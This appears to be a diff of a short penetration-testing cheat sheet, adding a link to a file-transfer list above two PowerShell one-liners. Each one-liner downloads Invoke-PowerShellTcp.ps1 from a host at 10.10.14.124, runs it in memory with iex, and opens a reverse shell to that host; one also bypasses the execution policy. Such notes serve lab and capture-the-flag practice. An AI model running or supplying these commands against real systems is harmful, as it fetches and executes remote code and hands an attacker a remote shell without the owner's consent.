@@ -1,3 +1,7 @@
+###
+https://github.com/egre55/ultimate-file-transfer-list
+
+
 powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.124:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.124 -Port 8002
 ```
  @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.14.124:8000/Invoke-PowerShellTcp.ps1'))";Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.124 -Port 4445
